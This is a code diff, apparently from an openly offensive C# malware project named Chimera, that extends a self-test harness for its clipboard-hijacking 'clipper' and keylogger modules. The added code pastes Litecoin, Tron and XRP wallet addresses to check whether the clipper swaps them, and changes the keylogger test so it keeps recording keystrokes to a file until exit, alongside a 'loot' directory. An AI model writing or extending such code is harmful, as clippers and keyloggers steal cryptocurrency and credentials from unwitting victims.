@@ -193,6 +193,33 @@ namespace Chimera
             Log("[ETH] got:     " + afterEth);
             Log("[ETH] swapped: " + (afterEth != testEth ? "YES" : "NO"));
 
+            // Test LTC swap
+            string testLtc = "LaMT349L7Lbs4zePVTArpN8EBUwBnQmBNe";
+            Commands.Shell.Execute("powershell -c \"Set-Clipboard '" + testLtc + "'\"");
+            Thread.Sleep(800);
+            string afterLtc = Commands.Shell.Execute("powershell -c \"Get-Clipboard\"").Trim();
+            Log("[LTC] sent:    " + testLtc);
+            Log("[LTC] got:     " + afterLtc);
+            Log("[LTC] swapped: " + (afterLtc != testLtc ? "YES" : "NO"));
+
+            // Test TRX swap
+            string testTrx = "TJCo98saj9EBbGtssLnjvVNy5oRMRMsEnK";
+            Commands.Shell.Execute("powershell -c \"Set-Clipboard '" + testTrx + "'\"");
+            Thread.Sleep(800);
+            string afterTrx = Commands.Shell.Execute("powershell -c \"Get-Clipboard\"").Trim();
+            Log("[TRX] sent:    " + testTrx);
+            Log("[TRX] got:     " + afterTrx);
+            Log("[TRX] swapped: " + (afterTrx != testTrx ? "YES" : "NO"));
+
+            // Test XRP swap
+            string testXrp = "rPT1Sjq2YGrBMTttX4GZHjKu9dyfzbpAYe";
+            Commands.Shell.Execute("powershell -c \"Set-Clipboard '" + testXrp + "'\"");
+            Thread.Sleep(800);
+            string afterXrp = Commands.Shell.Execute("powershell -c \"Get-Clipboard\"").Trim();
+            Log("[XRP] sent:    " + testXrp);
+            Log("[XRP] got:     " + afterXrp);
+            Log("[XRP] swapped: " + (afterXrp != testXrp ? "YES" : "NO"));
+
             Log(Commands.Clipper.Execute("status"));
             // Clipper stays running — monitoring clipboard until process exits
 
@@ -202,10 +229,11 @@ namespace Chimera
             Section("12. Keylogger test (keylog start + dump)");
             Log(Commands.Keylogger.Execute("start"));
             Thread.Sleep(500);
-            Log("[*] Keylogger running for 3 seconds - type something in any window...");
-            Thread.Sleep(3000);
+            Log("[*] Keylogger running for 5 seconds - type something in any window...");
+            Thread.Sleep(5000);
             Log(Commands.Keylogger.Execute("dump"));
-            Log(Commands.Keylogger.Execute("stop"));
+            // DO NOT stop — keylogger keeps running until process exits
+            Log("[*] Keylogger left running. Check C:\\projects\\keylogger.txt for real-time output.");
 
             // ----------------------------------------------------------------
             // DONE
@@ -215,7 +243,8 @@ namespace Chimera
             Log("Loot dir:  " + LocalConfig.LootDir);
             Log("");
             Log("Review the output above and paste to check for any [-] failures.");
-            Log("Clipper + Keylogger still active. Press Enter to exit (stops all monitors)...");
+            Log("Clipper + Keylogger BOTH still active. Type here or switch windows — keylogger.txt updates live.");
+            Log("Press Enter to exit...");
 
             logWriter.Close();
             Console.ReadLine();
